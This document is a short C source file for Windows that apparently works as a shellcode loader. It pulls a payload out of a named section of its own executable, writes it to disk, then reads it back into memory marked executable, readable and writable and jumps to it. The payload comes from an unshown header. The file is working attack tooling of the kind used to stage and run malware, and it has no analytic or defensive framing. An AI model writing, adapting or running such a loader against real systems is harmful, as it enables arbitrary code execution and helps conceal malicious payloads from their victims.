#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

void __stdcall UnpackShellcode(char *exe_path, char *save_path);
void __stdcall LoadShellcode(char *path);

int main(int argc, char *argv[])
{
	UnpackShellcode(argv[0], SHELLCODE_FILE);
	LoadShellcode(SHELLCODE_FILE);
}

void __stdcall UnpackShellcode(char *exe_path, char *save_path)
{
	HANDLE hFile = NULL;
	HANDLE hMap  = NULL;
	LPVOID pView = NULL;
	PIMAGE_DOS_HEADER  pDosHdr	   = NULL;
	PIMAGE_FILE_HEADER pFileHdr    = NULL;
	PIMAGE_OPTIONAL_HEADER pOptHdr = NULL;
	PIMAGE_SECTION_HEADER pSection = NULL;
	PIMAGE_SECTION_HEADER pShellcodeSect = NULL;
	char szSectName[IMAGE_SIZEOF_SHORT_NAME + 1] = {0};

	__try
	{
		hFile = CreateFile(exe_path, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) return;

		hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (!hMap) return;
		CloseHandle(hFile);

		pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
		if (!pView) return;

		pDosHdr = (PIMAGE_DOS_HEADER) pView;
		pFileHdr = (PIMAGE_FILE_HEADER) ((PBYTE)pDosHdr + pDosHdr->e_lfanew + sizeof(IMAGE_NT_SIGNATURE));
		pOptHdr = (PIMAGE_OPTIONAL_HEADER) ((PBYTE)pFileHdr + sizeof(IMAGE_FILE_HEADER));
		pSection = (PIMAGE_SECTION_HEADER) ((PBYTE)pOptHdr + sizeof(IMAGE_OPTIONAL_HEADER));

		for (int i = 0; i < pFileHdr->NumberOfSections; ++i)
		{
			memcpy(szSectName, pSection[i].Name, IMAGE_SIZEOF_SHORT_NAME);
			if (lstrcmpA(szSectName, SHELLCODE_SECTION) == 0)
			{
				pShellcodeSect = &pSection[i];
				break;
			}
		}
		if (!pShellcodeSect) return;

		PBYTE pShellcode = (PBYTE)pView + pShellcodeSect->PointerToRawData;
		DWORD dwSize = 0;
		for (int i = pShellcodeSect->SizeOfRawData - 1; i >= 0; --i)
		{
			if (pShellcode[i] != 0 && pShellcode[i] != 0xCC)
			{
				dwSize = i + 1;
				break;
			}
		}

		hFile = CreateFile(save_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE) return;

		DWORD written = 0;
		WriteFile(hFile, pShellcode, dwSize, &written, NULL);
	}
	__finally
	{
		if (hFile != INVALID_HANDLE_VALUE)
			CloseHandle(hFile);
		if (hMap)
			CloseHandle(hMap);
		if (pView)
			UnmapViewOfFile(pView);
	}
}

void __stdcall LoadShellcode(char *path)
{
	HANDLE hFile = NULL;
	DWORD dwSize = 0;
	DWORD dwRead = 0;
	char *pBuf = NULL;
	void *pShellcode = NULL;

	hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return;

	dwSize = GetFileSize(hFile, NULL);
	if (!dwSize) return;

	pBuf = (char *)malloc(dwSize);

	if (!ReadFile(hFile, pBuf, dwSize, &dwRead, NULL))
	{
		free(pBuf);
		return;
	}

	pShellcode = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pShellcode)
	{
		free(pBuf);
		return;
	}

	memcpy(pShellcode, pBuf, dwSize);

	((void (*)())pShellcode)();	//call shellcode

	VirtualFree(pShellcode, 0, MEM_RELEASE);
	free(pBuf);

}
